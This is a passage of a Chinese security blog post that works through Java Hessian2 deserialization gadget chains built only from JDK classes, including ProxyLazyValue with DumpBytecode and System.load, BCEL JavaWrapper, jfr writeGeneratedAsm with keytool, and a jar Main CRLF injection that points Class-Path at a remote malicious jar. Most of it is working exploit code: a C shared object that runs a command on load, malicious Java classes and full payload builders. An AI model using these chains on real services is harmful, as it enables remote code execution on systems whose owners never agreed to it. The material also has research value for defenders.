<p>但是在使用的过程中其实能发现一个问题，在 SwingLazyValue 进行 createValue 操作时，会出’java.lang.ClassNotFoundException’异常。具体原因其实是类加载导致的问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222223021368.png"
                      alt="image-20230222223021368"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222223854166.png"
                      alt="image-20230222223854166"
                ></p>
<p>由于在使用 forName 进行类的获取时，ClassLoad选取为空，没有获得类加载器，导致无法加载该包外的其他类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222224154420.png"
                      alt="image-20230222224154420"
                ></p>
<p>而该 SwingLazyValue 类在 rt.jar 的包下，DumpBytecode类在 nashorn.jar 里面，所以导致加载不了，还需要再去寻找其他的类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222224404105.png"
                      alt="image-20230222224404105"
                ></p>
<p>最后找到<code>ProxyLazyValue.createValue</code></p>
<p>ProxyLazyValue 为 UIDefaults 的内部类，其 createValue 方法内容为</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222225446664.png"
                      alt="image-20230222225446664"
                ></p>
<p>可以很清楚看到，这里通过线程获取到了当前的类加载器，然后通过该类加载器去执行了类加载的操作。除此以外由于 Hessian 序列化的机制，ProxyLazyValue里面的 field acc 是在反序列化过程中会报错 ， 所以需要将acc 反射设置为null。</p>
<p>我们可以写一个文件名为.class的.so文件，然后使用System.load加载（貌似这个load可以加载so文件(Linux下的程序函数库)和dll文件(动态链接库)），<font color="red"><strong>因为System.load不管后缀是什么都可以执行</strong></font></p>
<p>只需要将之前的链子里面的 SwingLazyValue 给换成  UIDefaults.ProxyLazyValue 即可。然后额外多一步就是去反射修改acc字段的值。</p>
<h3 id="生成恶意-so-文件"><a href="#生成恶意-so-文件" class="headerlink" title="生成恶意 so 文件"></a>生成恶意 so 文件</h3><p>里面的<code>__attribute__ ((__constructor__))</code> 是 gcc 的拓展，具体内容可以看看下面的内容</p>
<p><a href="https://blog.csdn.net/Zx_SSSS/article/details/79673610"><code>gcc扩展__attribute__((constructor))详解和在.a库中的使用方法</code></a></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((__constructor__))  calc ()&#123;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -c calc.c -o calc &amp;&amp; gcc calc --share -o calc.so</span><br></pre></td></tr></table></figure></div>



<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AnyStaticMethodExecute3</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 有局限性突破，可以加载任意静态类了</span></span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(className, methodName, args);</span><br><span class="line">        <span class="comment">// 反射修改 acc 的值为 null</span></span><br><span class="line">        Reflections.setFieldValue(proxyLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">ml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        Reflections.setFieldValue(ml, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">        evilGenerate(ml);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.ScriptEnvironment;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.logging.DebugLogger;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DumpBytecode_dumpBytecode_System_load</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">script</span> <span class="operator">=</span> Reflections.createWithoutConstructor(ScriptEnvironment.class);</span><br><span class="line">        <span class="comment">// 向 tmp 目录下写入文件</span></span><br><span class="line">        Reflections.setFieldValue(script,<span class="string">&quot;_dest_dir&quot;</span>,<span class="string">&quot;/tmp/&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">debug</span> <span class="operator">=</span> Reflections.createWithoutConstructor(DebugLogger.class);</span><br><span class="line">        <span class="comment">// 写入文件内容</span></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;./winCalc.so&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;jdk.nashorn.internal.codegen.DumpBytecode&quot;</span>, <span class="string">&quot;dumpBytecode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                script,</span><br><span class="line">                debug,</span><br><span class="line">                code,</span><br><span class="line">                classname</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//System.load加载so文件，执行前将前面的内容注释掉，以为反序列化过程中会报错，不注释走不到这里</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;java.lang.System&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;/tmp/koishi.class&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后加载即可，**<font color="red">注意linux和windows生成的so文件存在区别</font>**</p>
<p>还需要注意一点：System.load 方法需要传入<font color="red"><strong>完整的文件路径</strong></font></p>
<p>windows 下测试用代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.ScriptEnvironment;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.logging.DebugLogger;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DumpBytecode_dumpBytecode_System_load</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">script</span> <span class="operator">=</span> Reflections.createWithoutConstructor(ScriptEnvironment.class);</span><br><span class="line">        <span class="comment">// 向 tmp 目录下写入文件</span></span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(script,&quot;_dest_dir&quot;,&quot;/tmp/&quot;);</span></span><br><span class="line">        Reflections.setFieldValue(script,<span class="string">&quot;_dest_dir&quot;</span>,<span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">debug</span> <span class="operator">=</span> Reflections.createWithoutConstructor(DebugLogger.class);</span><br><span class="line">        <span class="comment">// 写入文件内容</span></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\winCalc.so&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;jdk.nashorn.internal.codegen.DumpBytecode&quot;</span>, <span class="string">&quot;dumpBytecode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                script,</span><br><span class="line">                debug,</span><br><span class="line">                code,</span><br><span class="line">                classname</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//System.load加载so文件，执行前将前面的内容注释掉，以为反序列化过程中会报错，不注释走不到这里</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;java.lang.System&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\koishi.class&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230223191542233.png"
                      alt="image-20230223191542233"
                ></p>
<h2 id="④JavaWrapper-mian"><a href="#④JavaWrapper-mian" class="headerlink" title="④JavaWrapper._mian"></a>④JavaWrapper._mian</h2><p>首先看看这个 <code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code> 类，先看看这个 <code>_main</code> 方法，它满足公开且静态。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230223223229206.png"
                      alt="image-20230223223229206"
                ></p>
<p>继续跟进看其 runMain 方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230223222905078.png"
                      alt="image-20230223222905078"
                ></p>
<p>该方法反射调用了指定 class 的”<code>_main</code>“方法，而该class_name 和 argv我们是可控的，我们只需要传入一个写好的_mian方法是恶意代码的类，即可执行任意命令。</p>
<p>然后加载类的操作是 <code>loader.loadClass(class_name)</code> ，而该类存在一个静态代码块，发现设置了类加载器为bcel加载器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230223225520755.png"
                      alt="image-20230223225520755"
                ></p>
<p>payload显然易见了，直接构造即可</p>
<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.evilFiles;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil_main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.evilFiles.Evil_main;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.JavaWrapper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaWrapper_mian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">evil</span> <span class="operator">=</span> Repository.lookupClass(Evil_main.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(evil.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>,<span class="string">&quot;_main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;payload&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="⑤System-setProperty-writeGeneratedAsm-sun-security-tools-keytool-Main-main"><a href="#⑤System-setProperty-writeGeneratedAsm-sun-security-tools-keytool-Main-main" class="headerlink" title="⑤System.setProperty + writeGeneratedAsm + sun.security.tools.keytool.Main.main"></a>⑤System.setProperty + writeGeneratedAsm + sun.security.tools.keytool.Main.main</h2><p>这个操作稍微多点，首先利用漏洞通过写入 System.setProperty 设置 jfr.save.generated.asm 为 true，然后 jdk.jfr.internal.Utils.writeGeneratedAsm 将 jar 文件写入（该方法自动写入后缀为class的文件中，文件名可随意），这里就需要将恶意class文件打包成jar</p>
<p> 首先看 <code>jdk.jfr.internal.Utils</code> 下的 <code>writeGeneratedAsm</code> 方法 （java8没这玩意，测试11以上都有，9没试过，咨询过后了解到java 8应该是有这个东西的，但是直接看不到）</p>
<p>想看可以去 <a class="link"   href="https://code.yawk.at/java/8/jdk/jfr/internal/Utils.java" >java&#x2F;8 : jdk&#x2F;jfr&#x2F;internal&#x2F;Utils.java (yawk.at) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（我这里是 java11 的内容，后续payload都是jdk8下使用的，为了看着方便，这里放这个截图）</p>
<p>（后来才发现，使用0ctf当时给的版本是可用的，版本为：openjdk 8u342，该版本下存在该类）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230224095800824.png"
                      alt="image-20230224095800824"
                ></p>
<p>这里有写文件操作。但是<code>SAVE_GENERATED</code> 默认为无，获取不到<code>SAVE_GENERATED</code>，就走不到后续内容。得去通过另一个静态方法改。</p>
<p><a class="link"   href="https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/#CVE-2021-21985" >VMware vCenter漏洞分析（一） - Blog (hosch3n.github.io-CVE-2021-21985) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>该文章中提到了这个类的漏洞使用方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230224101636714.png"
                      alt="image-20230224101636714"
                ></p>
<p>至此我们可以写入任意文件。（也可以利用这个写入上文提到的so文件，然后进行加载），这里我们使用另一个方式，写入一个jar包，通过jar包来执行任意命令。我们还需要去寻找一个类</p>
<p><code>sun.security.tools.keytool.Main</code>的 main 方法，其调用了本类的run方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">kt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        kt.run(args, System.out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(String[] args, PrintStream out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            args = parseArgs(args);</span><br><span class="line">            <span class="keyword">if</span> (command != <span class="literal">null</span>) &#123;</span><br><span class="line">                doCommands(out);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(rb.getString(<span class="string">&quot;keytool.error.&quot;</span>) + e);</span><br><span class="line">            <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                e.printStackTrace(System.out);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!debug) &#123;</span><br><span class="line">                System.exit(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            printWeakWarnings(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span>[] pass : passwords) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pass != <span class="literal">null</span>) &#123;</span><br><span class="line">                    Arrays.fill(pass, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                    pass = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ksStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                ksStream.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>在run方法中，又去使用了 doCommands 方法，这个doCommands方法会去加载类。方法内容比较多，本质上是去获取了一个URLClassLoader，然后通过我们可控的字符串进行一个加载，要走到这一步还需要设置几个字段值才行，但是都可控。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230224171853534.png"
                      alt="image-20230224171853534"
                ></p>
<p>通过上面的内容，我们的思路就很明显了，先 System.setProperty 设置 jfr.save.generated.asm 为 true， 然后 Utils 执行静态方法 writeGeneratedAsm 写入一个恶意 jar 包，然后通过 sun.security.tools.keytool.Main 的 main 方法，最终通过URLClassLoader 进行加载恶意类。</p>
<h3 id="恶意jar"><a href="#恶意jar" class="headerlink" title="恶意jar"></a>恶意jar</h3><p><strong>Evil.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">javac Evil.java</span><br><span class="line">jar cf Evil.jar Evil.class</span><br></pre></td></tr></table></figure></div>

<p>我又去研究了一下这个方法，好像就是直接写的字节数据，不用jar数据。也就是说我们直接写入class文件内容即可，这步jar貌似多余了，只执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac Evil.java</span><br></pre></td></tr></table></figure></div>

<p>貌似就行，我这里是这样的。</p>
<p>或者写入jar进行读取也行，感觉有点多此一举</p>
<h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><p>windows测试</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_toString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> jdk.jfr.internal.Utils;</span><br><span class="line"><span class="keyword">import</span> sun.security.tools.keytool.Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">writeGeneratedAsm_keytool_Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 设置对应的属性值</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;jfr.save.generated.asm&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="comment">//Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new String[]&#123;&quot;jfr.save.generated.asm&quot;,&quot;true&quot;&#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取 class 中的字节</span></span><br><span class="line">        <span class="comment">//byte[] classCode = Files.readAllBytes(Paths.get(&quot;R:\\languages\\Java\\study\\Hessian2\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\Evil.class&quot;));</span></span><br><span class="line">        <span class="type">byte</span>[] jarCode = Files.readAllBytes(Paths.get(<span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\Evil.jar&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入文件，这里需要注意，目录需要多写一层，多的这层是后续创建的文件的名字，后缀为class和asm</span></span><br><span class="line">        <span class="comment">// 后续修改 aimpath 即可</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">aimPath</span> <span class="operator">=</span> <span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\Evil&quot;</span>;</span><br><span class="line">        <span class="comment">//Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;jdk.jfr.internal.Utils&quot;, &quot;writeGeneratedASM&quot;, new Object[]&#123;aimPath, jarCode&#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入的jar路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jarPath</span> <span class="operator">=</span> aimPath+<span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="comment">// 写入的class路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span>aimPath.substring (<span class="number">0</span>, aimPath.length()-<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入后进行读取</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;sun.security.tools.keytool.Main&quot;</span>,<span class="string">&quot;main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-genkeypair&quot;</span>,<span class="string">&quot;-keypass&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;-keystore&quot;</span>,<span class="string">&quot;koishi&quot;</span>,<span class="string">&quot;-storepass&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;-providername&quot;</span>,<span class="string">&quot;hackx&quot;</span>,<span class="string">&quot;-providerclass&quot;</span>,<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;-providerpath&quot;</span>,jarPath&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="⑥sun-tools-jar-Main-main-sun-security-tools-keytool-Main-main"><a href="#⑥sun-tools-jar-Main-main-sun-security-tools-keytool-Main-main" class="headerlink" title="⑥sun.tools.jar.Main.main + sun.security.tools.keytool.Main.main"></a>⑥sun.tools.jar.Main.main + sun.security.tools.keytool.Main.main</h2><p>和上面那个差不多，写入后进行读取。</p>
<p>sun.security.tools.keytool.Main.main 很熟悉了，就不做过多介绍了。</p>
<p>通过 sun.tools.jar.Main.main 生成jar文件，在填入参数时可进行 CRLF 注入，采用 cfe 模式，通过 e 指定 Main-Class 的时候定义 Class-Path 从而远程加载恶意 jar 达到 RCE。</p>
<p><strong>Class-Path 指定jar包的依赖关系，class loader会依据这个路径来搜索class</strong></p>
<p>再通过 sun.security.tools.keytool.Main.main 触发 Class-Path 加载 jar 包</p>
<h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_toString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jar_Main_keytool_Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;sun.tools.jar.Main&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">winTestPath</span> <span class="operator">=</span> <span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\Koishi.jar&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">linuxAimPath</span> <span class="operator">=</span> <span class="string">&quot;/tmp/koishi.jar&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">testExistFile</span> <span class="operator">=</span><span class="string">&quot;R:\\a\\hello.txt&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">linuxExistFile</span> <span class="operator">=</span> <span class="string">&quot;/etc/hosts&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCRLFHTTP</span> <span class="operator">=</span> <span class="string">&quot;aaaa\nClass-Path: http://127.0.0.1:8088/Evil.jar&quot;</span>;</span><br><span class="line">        Object[] evilargs = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;cfe&quot;</span>, winTestPath,evilCRLFHTTP,testExistFile &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 写入Class-Path 内容</span></span><br><span class="line">        <span class="comment">//Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(classname,methodName,evilargs);</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;sun.security.tools.keytool.Main&quot;</span>,<span class="string">&quot;main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-genkeypair&quot;</span>,<span class="string">&quot;-keypass&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;-keystore&quot;</span>,<span class="string">&quot;koishi&quot;</span>,<span class="string">&quot;-storepass&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;-providername&quot;</span>,<span class="string">&quot;hackx&quot;</span>,<span class="string">&quot;-providerclass&quot;</span>,<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;-providerpath&quot;</span>,winTestPath&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="触发效果"><a href="#触发效果" class="headerlink" title="触发效果"></a>触发效果</h3><p>这个利用方法我还是头一回见，但是还没细跟，我这里放一下一些操作导致的结果的截图</p>
